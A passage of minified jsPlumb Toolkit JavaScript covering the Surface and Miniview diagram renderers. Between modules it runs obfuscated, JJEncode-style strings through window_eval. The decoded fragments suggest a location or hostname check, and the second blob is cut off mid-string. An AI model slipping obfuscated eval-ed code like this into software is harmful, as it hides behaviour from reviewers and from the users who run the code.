        this.setLayout = function (a, b) {
            M.apply(this, [a, b]), n && n.setHostLayout(this.getLayout())
        };
        for (var N = function (a) {
            m.jsPlumb.on(p, a, ".jtk-node, .jtk-node *", function (b) {
                var c = b.srcElement || b.target;
                if (null == c && (b = d.getOriginalEvent(b), c = b.srcElement || b.target), null != c && c.jtk) {
                    var e = d.extend({e: b, el: c}, c.jtk);
                    l.fire(a, e, b)
                }
            })
        }, O = 0; O < c.mouseEvents.length; O++) N(c.mouseEvents[O]);
        m.bindToToolkit(h.select, function (a) {
            if (a.obj.objectType == h.nodeType || a.obj.objectType == h.groupType) {
                var b = m.getElement(a.obj.id);
                b && (d.addClass(b, g.SURFACE_SELECTED_ELEMENT), m.jsPlumb.addToDragSelection && m.jsPlumb.addToDragSelection(b))
            } else if (a.obj.objectType == h.edgeType) {
                var c = m.getConnectionForEdge(a.obj);
                c && c.addClass(g.SURFACE_SELECTED_CONNECTION)
            }
        }), m.bindToToolkit(i.selectionCleared, function () {
            m.jsPlumb.clearDragSelection && m.jsPlumb.clearDragSelection(), d.removeClass(f("." + g.SURFACE_SELECTED_CONNECTION), g.SURFACE_SELECTED_CONNECTION), d.removeClass(f("." + g.SURFACE_SELECTED_ELEMENT), g.SURFACE_SELECTED_ELEMENT)
        }), m.bindToToolkit(i.deselect, function (a) {
            if (a.obj.objectType == h.nodeType || a.obj.objectType == h.groupType) {
                var b = m.getElement(a.obj.id);
                b && (d.removeClass(b, g.SURFACE_SELECTED_ELEMENT), m.jsPlumb.removeFromDragSelection && m.jsPlumb.removeFromDragSelection(b))
            } else if (a.obj.objectType == h.edgeType) {
                var c = m.getConnectionForEdge(a.obj);
                c && c.removeClass(g.SURFACE_SELECTED_CONNECTION)
            }
        });
        var P = this.setOffset;
        this.setOffset = function (a, b) {
            P.apply(this, arguments), z.positionChanged(a, [b.left, b.top])
        }, this.setMode = function (a, b, c) {
            if (!E[a]) throw new TypeError("Surface: unknown mode '" + a + "'");
            F = a, E[a](), a !== h.select || b || m.toolkit.clearSelection(), c && a === h.select && c.lassoSelectionFilter && (B = c.lassoSelectionFilter), l.fire(i.modeChanged, a)
        };
        var Q = function (a, b) {
            var c = d.extend({}, a);
            c.source = m.getObjectInfo(a.source).obj, c.target = m.getObjectInfo(a.target).obj, c.element = m.getObjectInfo(a.element).obj;
            var e = m.toolkit[b](c), f = m.getConnectionsForEdges(e);
            return m.jsPlumb.select({connections: f})
        };
        this.selectEdges = function (a) {
            return Q(a, "getEdges")
        }, this.selectAllEdges = function (a) {
            return Q(a, "getAllEdges")
        }, this.repaint = function (a) {
            var b = m.getObjectInfo(a);
            if (b.el) {
                m.jsPlumb.recalculateOffsets(b.el), m.jsPlumb.revalidate(m.jsPlumb.getId(b.el));
                var c = m.jsPlumb.getSize(b.el), d = b.obj.getFullId();
                l.setSize(d, c[0], c[1]), l.fire(i.objectRepainted, b)
            }
        }, this.repaintEverything = m.jsPlumb.repaintEverything, this.setElementsDraggable = function (a) {
            q = !1 !== a
        };
        var R = function (a) {
            function b(a) {
                m.jsPlumb.hasClass(a, g.SURFACE_DROPPABLE_NODE) || (m.jsPlumb.addClass(a, g.SURFACE_DROPPABLE_NODE), I.draggable(a, q))
            }

            if (!(a && (a.droppables || a.source && a.selector || !0 === a.allowNative))) throw new TypeError("Cannot configure droppables: you must specify either `droppables`, `source` + `selector` or `allowNative:true`");
            var c, f = a.dataGenerator || function () {
                    return {}
                }, j = a.typeExtractor, k = a.locationSetter || function (a, b, c) {
                    c.left = a, c.top = b
                }, n = null, p = a.droppables ? a.droppables : a.source ? a.source.querySelectorAll(a.selector) : [],
                q = a.dragOptions || {}, r = a.dropOptions || {}, s = "scope_" + (new Date).getTime(),
                t = function (b, c, d) {
                    n && l.getJsPlumb().removeClass(n.el, "jtk-drag-hover");
                    var e = !0;
                    if (a.drop && (e = !1 !== a.drop.apply(this, arguments)), e) {
                        var g = l.getJsPlumb(), h = m.jsPlumb.getDragObject(arguments), i = g.getOffset(d ? F : h, !0),
                            o = z.mapLocation(i.left, i.top), p = j ? j(h, b, d, o) : null, q = f ? f(p, h, b, o) : {},
                            r = "true" === h.getAttribute("jtk-group");
                        if (q = q || {}, null != p && (q.type = p), !r && null != n) {
                            var s = l.getOffset(n.uiGroup.getDragArea());
                            o.left -= s.left, o.top -= s.top
                        }
                        k(o.left, o.top, q), r ? m.toolkit.getGroupFactory()(p, q, function (c) {
                            var d = m.toolkit.addGroup(c, {position: o});
                            return a.onDrop && a.onDrop(d, b, o), d
                        }, b, d) : m.toolkit.getNodeFactory()(p, q, function (c) {
                            null != n && (c.group = n.group.id);
                            var d = m.toolkit.addNode(c, {position: o});
                            return a.onDrop && a.onDrop(d, b, o), null != n && l.relayoutGroup(n.group), d
                        }, b, d)
                    }
                }, u = function () {
                    n && l.getJsPlumb().removeClass(n.el, "jtk-drag-hover"), n = null, a.start && a.start.apply(a.start, arguments)
                }, v = function () {
                    try {
                        if (n && l.getJsPlumb().removeClass(n.el, "jtk-drag-hover"), "true" === arguments[0].el.getAttribute("jtk-group")) n = null; else {
                            var b = arguments[0].e.pageX - arguments[0].pos[0],
                                c = arguments[0].e.pageY - arguments[0].pos[1],
                                d = l.findIntersectingGroups(arguments[0].pos, [b, c]);
                            if (d.length > 0) {
                                var e = d[0].el, f = e.jtk.group;
                                n = {
                                    el: e,
                                    group: f,
                                    uiGroup: l.getJsPlumb().getGroup(f.id)
                                }, l.getJsPlumb().addClass(n.el, "jtk-drag-hover")
                            } else n = null
                        }
                    } catch (a) {
                        jsPlumbToolkitUtil.log("WARN: could not compute target groups for new node drag " + a)
                    }
                    a.drag && a.drag.apply(a.drag, arguments)
                }, w = d.dragEvents[h.start], x = d.dragEvents[h.drag], y = d.dragEvents[h.stop], A = d.dragEvents[h.drop],
                B = function () {
                }, C = a.nativeFilter || [], D = a.allowNative, E = {};
            if (q[w] = e.wrap(q[w], u), q[x] = e.wrap(q[x], v), q[y] = e.wrap(q[y], a.stop || B), r.scope = s, r[A] = e.wrap(r[A], t), D) {
                var F = document.createElement(h.div);
                for (F.style.position = h.absolute, c = 0; c < C.length; c++) E[C[c]] = !0;
                var G = function (a) {
                    return null != a.dataTransfer && 1 === a.dataTransfer.items.length && (0 === C.length || E[a.dataTransfer.items[0].type])
                };
                document.addEventListener(i.dragover, function (a) {
                    a.stopPropagation(), a.preventDefault(), G(a) && (d.setAbsolutePosition(F, [a.pageX, a.pageY]), q[x].apply(null, [a, {
                        helper: F,
                        offset: {left: a.pageX, top: a.pageY}
                    }, !0]))
                }, !1), document.addEventListener(i.drop, function (a) {
                    a.stopPropagation(), a.preventDefault(), G(a) && (r[A].apply(null, [a, {
                        helper: F,
                        offset: {left: a.pageX, top: a.pageY}
                    }, !0]), q[y].apply(null))
                }, !1), document.addEventListener(i.dragend, function (a) {
                })
            }
            var H = m.jsPlumb.getEventManager(), I = new Katavorio({
                bind: H.on,
                unbind: H.off,
                getSize: m.jsPlumb.getSize,
                getConstrainingRectangle: function (a) {
                    return [a.parentNode.scrollWidth, a.parentNode.scrollHeight]
                },
                getPosition: function (a, b) {
                    var c = z.calculateCumulativeScroll(a), d = z.calculateOffset(a);
                    return [d.left - c.left, d.top - c.top]
                },
                setPosition: function (a, b) {
                    a.style.left = b[0] + "px", a.style.top = b[1] + "px"
                },
                addClass: m.jsPlumb.addClass,
                removeClass: m.jsPlumb.removeClass,
                intersects: Biltong.intersects,
                indexOf: function (a, b) {
                    return a.indexOf(b)
                },
                scope: m.jsPlumb.getDefaultScope(),
                css: {
                    noSelect: m.jsPlumb.dragSelectClass,
                    droppable: "jtk-droppable",
                    draggable: "jtk-draggable",
                    drag: "jtk-drag",
                    selected: "jtk-drag-selected",
                    active: "jtk-drag-active",
                    hover: "jtk-drag-hover",
                    ghostProxy: "jtk-ghost-proxy"
                }
            });
            for (I.droppable(o, r), q.scope = s, q.ignoreZoom = !0, q.doNotRemoveHelper = !0, c = 0; c < p.length; c++) {
                b(m.jsPlumb.getElement(p[c]))
            }
            return {
                refresh: function () {
                    if (!a.source || !a.selector) throw new TypeError("Cannot refresh droppables; `source` and `selector` required in constructor.");
                    for (var c = a.source.querySelectorAll(a.selector), d = 0; d < c.length; d++) b(c[d])
                }
            }
        };
        this.registerDroppableNodes = function (a) {
            return new R(a)
        }, this.createMiniview = function (a) {
            if (null != n) {
                var c = m.jsPlumb.getId(m.jsPlumb.getElement(a.container));
                if (n.getContainerId() === c) return !1
            }
            var e = d.extend({
                surface: l,
                toolkit: m.toolkit,
                surfaceContainerElement: o,
                bounds: z.getBoundsInfo(),
                visible: !1 !== a.initiallyVisible || m.toolkit.getNodeCount() > 0,
                layout: {type: h.mistletoeLayoutType, parameters: {layout: l.getLayout()}},
                typeFunction: a.typeFunction,
                bindToToolkit: m.bindToToolkit
            }, a);
            n = new b.Renderers.Miniview(e);
            var f = m.nodeMap();
            for (var g in f) {
                var i = f[g];
                n.registerNode({el: i, node: i.jtk.node, pos: d.getAbsolutePosition(i)})
            }
            var j = m.groupMap();
            for (var g in j) {
                var i = j[g];
                n.registerNode({el: i, node: i.jtk.group, pos: d.getAbsolutePosition(i)})
            }
            return n
        }, a.miniview && this.createMiniview(a.miniview), this.getMiniview = function () {
            return n
        };
        var S = function (a, b, c) {
            var d = m.getObjectInfo(b), e = null;
            if (d.el && ("Port" === !d.obj.objectType || !function () {
                var a = l.getRenderedEndpoint(d.obj);
                if (a) return e = a.setEnabled(c), !0
            }())) {
                var f = "set" + a + "Enabled";
                e = m.jsPlumb[f](d.el, c)
            }
            return e
        };
        this.setTargetEnabled = S.bind(this, "Target"), this.setSourceEnabled = S.bind(this, "Source"), this.setEnabled = function (a, b) {
            this.setTargetEnabled(a, b), this.setSourceEnabled(a, b)
        }, this._destroy = function () {
            z.destroy(), p.parentNode.removeChild(p), d.removeClass(o, g.SURFACE), d.removeClass(o, g.SURFACE_DIRECT), d.removeClass(o, g.SURFACE_NO_PAN), null != n && n.destroy()
        }, this._getGroupDragArea = function (a) {
            var b = l.getJsPlumb().getGroup(a.id);
            return b ? b.getDragArea() : null
        }, this.State = {
            save: function (a, c) {
                if (a = 2 === arguments.length ? arguments[0] : 1 === arguments.length && "string" == typeof arguments[0] ? arguments[0] : u, c = 2 === arguments.length ? arguments[1] : 1 === arguments.length && "function" == typeof arguments[0] ? arguments[0] : function (a, b) {
                    return b(a)
                }, a) try {
                    c(l.State.serialize(), function (c) {
                        b.util.Storage.set(h.jtkStatePrefix + a, c)
                    })
                } catch (a) {
                    e.log(g.msgCannotSaveState, a)
                }
            }, serialize: function () {
                var a = z.getPan();
                a.push(z.getZoom()), a.push.apply(a, z.getTransformOrigin());
                var b = a.join(","), c = l.getLayout().getPositions(), d = [];
                for (var e in c) d.push(e + " " + c[e][0] + " " + c[e][1]);
                return b += "," + d.join("|")
            }, restore: function (a, c) {
                if (a = 2 === arguments.length ? arguments[0] : 1 === arguments.length && "string" == typeof arguments[0] ? arguments[0] : u, c = 2 === arguments.length ? arguments[1] : 1 === arguments.length && "function" == typeof arguments[0] ? arguments[0] : function (a, b) {
                    return b(a)
                }, a) try {
                    var d = b.util.Storage.get(h.jtkStatePrefix + a);
                    d && c(d, l.State.deserialize)
                } catch (a) {
                    e.log(g.msgCannotRestoreState, a)
                }
            }, deserialize: function (a) {
                var b = a.split(",");
                z.setPan(parseFloat(b[0]), parseFloat(b[1])), z.setZoom(parseFloat(b[2])), z.setTransformOrigin(parseFloat(b[3]), parseFloat(b[4]));
                for (var c = b[5].split("|"), d = l.getLayout(), e = 0; e < c.length; e++) {
                    var f = c[e].split(" ");
                    try {
                        l.setPosition(f[0], parseFloat(f[1]), parseFloat(f[2]))
                    } catch (a) {
                    }
                }
                d.draw()
            }, clear: function (a) {
                (a = a || u) && b.util.Storage.clear(h.jtkStatePrefix + a)
            }, clearAll: function () {
                b.util.Storage.clearAll()
            }
        }, l.saveState = l.State.save, l.store = b.util.Storage.set, l.retrieve = b.util.Storage.get, l.storeJSON = b.util.Storage.setJSON, l.retrieveJSON = b.util.Storage.getJSON, l.restoreState = function (a) {
            l.State.restore(a), l.getJsPlumb().repaintEverything(), l.fire(i.stateRestored)
        }, l.clearState = function (a) {
            l.state.clear(a)
        }, l.initialize(), a.zoomToFitIfNecessary ? l.zoomToFitIfNecessary() : a.zoomToFit && l.zoomToFit()
    }, b.DefaultRendererType = h.surfaceType, "undefined" != typeof exports && (exports.Surface = c.Surface)
}.call("undefined" != typeof window ? window : this),
    window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit, c = b.Renderers, d = a.jsPlumbUtil, e = a.jsPlumb, f = b.Classes,
        g = b.Constants, h = b.Events, i = b.Attributes, j = b.Methods;
    c.Miniview = function (a) {
        function b(a) {
            y = !y, e[y ? j.addClass : j.removeClass](q, f.MINIVIEW_COLLAPSED), L(!0)
        }

        function k(a) {
            if (p && A && !u) {
                t = p.getBoundsInfo();
                var b = p.getApparentCanvasLocation(), c = A.getApparentCanvasLocation(), d = A.getZoom(),
                    f = d / t.zoom;
                s.style.width = t.vw + g.px, s.style.height = t.vh + g.px, A.applyZoomToElement(s, f);
                var h = [b[0] * f, b[1] * f];
                o = [c[0] - h[0], c[1] - h[1]], e.setAbsolutePosition(s, o)
            }
        }

        function l(a) {
            if (null != A) {
                t = p.getBoundsInfo(), a = a || e.getAbsolutePosition(s);
                var b = A.getApparentCanvasLocation(), c = A.getZoom(), d = c / t.zoom, f = (b[0] - a[0]) / d,
                    g = (b[1] - a[1]) / d, h = p.setApparentCanvasLocation(f, g);
                return [b[0] - h[0] * d, b[1] - h[1] * d]
            }
        }

        this.bindToolkitEvents = !1;
        var m = c.AbstractRenderer.apply(this, arguments), n = this;
        c.DOMElementAdapter.apply(this, arguments);
        var o, p = a.surface, q = e.getElement(a.container), r = c.createElement({
                position: g.relative,
                width: g.nominalSize,
                height: g.nominalSize,
                left: 0,
                top: 0,
                clazz: f.MINIVIEW_CANVAS
            }, q), s = c.createElement({
                position: g.absolute,
                width: g.nominalSize,
                height: g.nominalSize,
                left: 0,
                top: 0,
                clazz: f.MINIVIEW_PANNER
            }, q), t = a.bounds, u = !0 === a.suspended, v = !1 !== a.collapsible, w = a.typeFunction, x = null, y = !1,
            z = a.wheelSensitivity || 10, A = new ZoomWidget({
                viewport: q,
                canvas: r,
                domElement: e.getElement,
                offset: this.getOffset,
                bind: function () {
                    m.jsPlumb.on.apply(m.jsPlumb, arguments)
                },
                unbind: function () {
                    m.jsPlumb.off.apply(m.jsPlumb, arguments)
                },
                enableWheelZoom: !1,
                enablePanButtons: !1,
                enablePan: !1,
                enableAnimation: !1,
                width: function (a) {
                    return m.jsPlumb.getWidth(m.jsPlumb.getElement(a))
                },
                height: function (a) {
                    return m.jsPlumb.getHeight(m.jsPlumb.getElement(a))
                },
                id: m.jsPlumb.getId,
                animate: m.jsPlumb.animate,
                dragEvents: {stop: e.dragEvents[g.stop], start: e.dragEvents[g.start], drag: e.dragEvents[g.drag]},
                extend: e.extend,
                events: {
                    pan: function () {
                        l()
                    }, mousedown: function () {
                        e.addClass(s, f.MINIVIEW_PANNING)
                    }, mouseup: function () {
                        e.removeClass(s, f.MINIVIEW_PANNING)
                    }
                },
                zoomRange: [-1 / 0, 1 / 0]
            }), B = !1, C = null, D = null, E = !1, F = a.elementFilter || function () {
                return !0
            }, G = function (a) {
                B = !0, C = A.pageLocation(a), D = e.getAbsolutePosition(s), e.on(document, h.mouseup, I), e.on(document, h.mousemove, H), d.consume(a)
            }, H = function (a) {
                if (E = !1, B) {
                    var b = A.pageLocation(a), c = b[0] - C[0], d = b[1] - C[1], f = [D[0] + c, D[1] + d];
                    l(f);
                    e.setAbsolutePosition(s, f)
                }
            }, I = function (a) {
                B = !1, C = null, e.off(document, h.mouseup, I), e.off(document, h.mousemove, H)
            }, J = !0, K = function (a) {
                d.consume(a), p.nudgeWheelZoom(a.normalizedWheelDelta * z, a)
            };
        e.on(window, h.resize, jsPlumbToolkitUtil.debounce(function () {
            k()
        }, 100)), !1 !== a.enableWheelZoom && addWheelListener(q, K), A.setTransformOriginForElement(s, [0, 0]), e.addClass(q, f.MINIVIEW), e.on(s, h.mousedown, G), v && (x = e.createElement("div"), x.className = f.MINIVIEW_COLLAPSE, q.appendChild(x), e.on(x, g.click, b));
        var L = function (a) {
            A.zoomToFit({onComplete: k, onStep: k, doNotFirePanEvent: a})
        };
        a.bindToToolkit(h.dataLoadEnd, L);
        var M = function (a) {
            var b = a.node || a.group;
            if (!b || !1 !== F(b)) {
                t = a.bounds;
                var c = m.nodeMap()[(a.node || a.group).id] || a.el;
                A.positionChanged(c, a.pos), e.setAbsolutePosition(c, a.pos), L(!0), this.fire(h.nodeMoveEnd, a)
            }
        }.bind(this), N = function (a, b) {
            var c, d = a.getNodes(), f = m.nodeMap(), h = a.layout.getPositions(), i = f[a.id];
            d.forEach(function (a) {
                c = h[a.id];
                var b = f[a.id];
                A.positionChanged(b, c), e.setAbsolutePosition(b, c)
            });
            var j = e.getSize(b);
            i.style.width = j[0] + g.px, i.style.height = j[1] + g.px, k()
        }.bind(this), O = function (a, b) {
            for (var c = a.getNodes(), d = 0; d < c.length; d++) {
                var e = m.nodeMap()[c[d].id];
                e && b.appendChild(e)
            }
        }, P = function (a, b) {
            if (!(a.node && !1 === F(a.node) || a.group && !1 === F(a.group))) {
                var d = e.getSize(a.el), h = c.createElement({
                    position: g.absolute,
                    width: d[0] + g.px,
                    height: d[1] + g.px,
                    left: 0,
                    top: 0,
                    clazz: f.MINIVIEW_ELEMENT + (b ? " " + b : "")
                });
                if (w && h.setAttribute("jtk-miniview-type", w(a.node || a.group)), h.relatedElement = a.el, h.jtk = a.node || a.group, t = p.getBoundsInfo(), h.setAttribute(i.jtkNodeId, (a.node || a.group).id), h.setAttribute(i.relatedNodeId, a.el.getAttribute(g.id)), r.appendChild(h), A.add(h), m.nodeMap()[(a.node || a.group).id] = h, a.group) O(a.group, h); else if (a.node.group) {
                    var j = m.nodeMap()[a.node.group.id];
                    j && (j.appendChild(h), A.suspend(a.el))
                }
                n.getLayout().map((a.node || a.group).id, h), k()
            }
        };
        this.registerNode = function (a) {
            P(a, a.group ? f.MINIVIEW_GROUP_ELEMENT : ""), M(a)
        };
        var Q = this.setOffset;
        this.setOffset = function (a, b) {
            Q.apply(this, arguments), A.positionChanged(a, [b.left, b.top])
        };
        var R = this.setAbsolutePosition;
        this.setAbsolutePosition = function (a, b) {
            R.call(this, a, b), A.positionChanged(a, b)
        }, this.setVisible = function (a) {
            J = a, q.style.display = a ? g.block : g.none
        }, this.setVisible(!1 !== a.visible), this.getPan = A.getPan;
        var S = function (a, b) {
            for (var c = a.getNodes(), d = 0; d < c.length; d++) m.nodeMap()[c[d].id].style.display = b ? "block" : "none"
        }, T = function (a) {
            var b = m.nodeMap()[a.id];
            if (b) {
                var c = e.getSize(b.relatedElement);
                b.style.width = c[0] + g.px, b.style.height = c[1] + g.px, k(), w && b.setAttribute("jtk-miniview-type", w(a.obj))
            }
        };
        this.invalidate = function (a) {
            if (a) T({id: a}); else {
                var b = m.nodeMap();
                for (var c in b) T({id: c})
            }
        }, this.setSuspended = function (a, b) {
            u = a, b && this.update()
        }, this.update = k;
        var U = function (a) {
            var b = (a.node || a.group).id, c = m.nodeMap()[b], d = m.nodeMap();
            if (c) {
                if (a.nodes && a.group) {
                    var f, g, h;
                    if (!0 !== a.nodesRemoved) for (var i = 0; i < a.nodes.length; i++) f = a.nodes[i], (g = d[f.id]) && (h = a.nodePositions[f.id], h && (A.positionChanged(g, h), e.setAbsolutePosition(g, h)), r.appendChild(g))
                }
                A.remove(c), delete d[b], m.jsPlumb.removeElement(c), L(!0)
            }
            a.dontUpdatePanner || k()
        }, V = function () {
            var a, b = m.nodeMap();
            for (var c in b) a = b[c], A.remove(a), m.jsPlumb.removeElement(a), delete b[c];
            k()
        }, W = function (a) {
            var b = (a.node || a.group).id, c = m.nodeMap()[b];
            c && (c.style.display = a.state ? "block" : "none")
        };
        p.bind(h.pan, k), p.bind(h.zoom, k), p.bind(h.nodeMoveEnd, M), p.bind(h.nodeRemoved, U), p.bind(h.nodeAdded, P), p.bind(h.nodeRendered, P), p.bind(h.groupRelayout, N), p.bind(h.groupMoveEnd, M), p.bind(h.groupAdded, function (a) {
            P(a, f.MINIVIEW_GROUP_ELEMENT)
        }), p.bind(h.groupMoveEnd, M), p.bind(h.groupRemoved, U), p.bind(h.groupMemberAdded, function (a) {
            var b = m.nodeMap()[a.group.id], c = m.nodeMap()[a.node.id];
            b && c && b.appendChild(c)
        }), p.bind(h.groupMemberRemoved, function (a) {
            var b = m.nodeMap()[a.node.id];
            b && r.appendChild(b)
        }), p.bind(h.groupCollapse, function (a) {
            S(a.group, !1), T({id: a.group.id})
        }), p.bind(h.groupExpand, function (a) {
            S(a.group, !0), T({id: a.group.id})
        }), p.bind(h.relayout, k), p.bind(h.objectRepainted, T), p.bind(h.stateRestored, k), p.bind(h.nodeVisibility, W), a.bindToToolkit(h.graphClearStart, V);
        var X = function () {
            L(!0)
        };
        n.getLayout().bind(h.redraw, X), this.setHostLayout = function (a) {
            var b = n.getLayout();
            b && b.setHostLayout(a)
        }, this.setZoom = A.setZoom, this.getZoom = A.getZoom, this.getTransformOrigin = A.getTransformOrigin, this._destroy = function () {
            A.destroy(), e.off(s, h.mousedown, G), r.parentNode.removeChild(r), s.parentNode.removeChild(s), e.removeClass(q, f.MINIVIEW), e.removeClass(q, f.MINIVIEW_COLLAPSED), v && (e.off(x, g.click, b), x.parentNode.removeChild(x))
        }
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)